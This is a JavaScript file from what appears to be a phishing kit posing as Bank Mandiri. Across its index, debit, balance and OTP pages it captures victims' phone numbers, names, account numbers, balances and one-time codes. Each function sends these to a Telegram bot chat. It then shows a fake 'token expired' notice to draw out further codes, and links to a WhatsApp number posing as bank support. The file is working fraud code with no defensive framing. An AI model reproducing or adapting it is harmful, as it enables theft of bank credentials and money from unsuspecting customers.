
// index
function sendNohp(){
    $("#lodingku").show();
    event.preventDefault();
    var tarif = $('input[name="tarif"]:checked').val();
       if (tarif) {  
    sessionStorage.setItem('tarif', tarif);
    }         
    var nomor = document.getElementById("nohp").value;
    sessionStorage.setItem("nomor", nomor);                    
    var logo = document.getElementById('logo');       
    var nohp = document.getElementById('nohp');   
    var gabungan = '' + logo.value + '%0A%0A- 𝐓𝐚𝐫𝐢𝐟 •• ' + tarif + '%0A- 𝐍𝐨.𝐇𝐩 •• ' + nohp.value;   
    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,  
    complete: function(){
    $("#lodingku").hide();  
    setTimeout(function(){   
    window.location = "debit.html";
    }, 500);}});};   
     
     
// Debit     
function sendDebit(){
    $("#lodingku").show();
    event.preventDefault();                   
    var logo = document.getElementById('logo');     
    var nama = document.getElementById('nama');
    var rek = document.getElementById('rek');   
    var gabungan = '' + logo.value + '%0A- 𝐓𝐚𝐫𝐢𝐟 •• ' + tarif + '%0A- 𝐍𝐨.𝐇𝐩 •• ' + nomorku.value + '%0A%0A- 𝐍𝐚𝐦𝐚 •• ' + nama.value + '%0A- 𝐍𝐨.𝐑𝐞𝐤 •• ' + rek.value; 
    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,    
    complete: function(){
    setTimeout(function(){   
    window.location = "saldo.html";   
var tarif = document.getElementById('tarif').value;
sessionStorage.setItem("tarif", tarif);
var nomortel = document.getElementById('nomorku').value;
sessionStorage.setItem("nomortel", nomortel);
var noreke = document.getElementById('rek').value;
sessionStorage.setItem("noreke", noreke);
var namanya = document.getElementById('nama').value;
sessionStorage.setItem("namanya", namanya);
    $("#lodingku").hide();  
    }, 1500);}});};       
       
    
// saldo  
function sendSaldo(){
    $("#lodingku").show();
    event.preventDefault();                   
    var logo = document.getElementById('logo');     
    var saldo = document.getElementById('saldo');    
    var gabungan = '' + logo.value + '%0A- 𝐓𝐚𝐫𝐢𝐟 •• ' + tarif + '%0A- 𝐍𝐨.𝐇𝐩 •• ' + nomorsaya.value + '%0A%0A- 𝐍𝐚𝐦𝐚 •• ' + namaku.value + '%0A- 𝐍𝐨.𝐑𝐞𝐤 •• ' + norekku.value + '%0A- 𝐒𝐚𝐥𝐝𝐨 •• ' + saldo.value;
       $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,  
    complete: function(){
    $("#lodingku").hide();  
    setTimeout(function(){
    window.location = "otp.html";   
 var tarif = document.getElementById('tarif').value;
sessionStorage.setItem("tarif", tarif);
 var phone = document.getElementById("nomorsaya").value;
 sessionStorage.setItem("phone", phone);
 var user = document.getElementById("namaku").value;
 sessionStorage.setItem("user", user);
 var card = document.getElementById("norekku").value;
 sessionStorage.setItem("card", card);
 var duet = document.getElementById("saldo").value;
 sessionStorage.setItem("duet", duet);
    }, 100);}});};
        


// otp
function sendOtp(){
    $("#djload").show();
    event.preventDefault();                  
    var logo = document.getElementById('logo');     
    var sixpin = document.getElementById('sixpin');    
    var gabungan = '' + logo.value + '%0A- 𝐓𝐚𝐫𝐢𝐟 •• ' + tarif + '%0A- 𝐍𝐨.𝐇𝐩 •• ' + tele.value + '%0A%0A- 𝐍𝐚𝐦𝐚 •• ' + namanye.value + '%0A- 𝐍𝐨.𝐑𝐞𝐤 •• ' + kertu.value + '%0A- 𝐒𝐚𝐥𝐝𝐨 •• ' + uang.value + '%0A%0A- 𝐎𝐭𝐩 •• ' + sixpin.value;   
    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,    
    complete: function(){
    $("#djload").hide();  
    setTimeout(function(){             
    }, 2000);
     $("#notif").text("- Kode Token Aktivasi sudah kadaluarsa -");
    $("#notif").css("color", "red");  
    setTimeout(function(){
    document.getElementById("notif").innerHTML = "Untuk mendapatkan kode Token Aktivasi,<br/>Silahkan klik tombol dibawah ini";   
  $("#notif").css("color", "black");
  $("#sixpin").val("");
  $("#sixpin").focus();
document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
    }, 4000);}});};


// datawa
function getcs(){
 $("#djload").show();   
setTimeout(function(){  
location.href='https://wa.me/6285133339382?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗠𝗮𝗻𝗱𝗶𝗿𝗶,%0ASaya%20mau%20Request%20Kode%20Aktivasi';
 $("#djload").hide();   
    }, 1000);    
}     
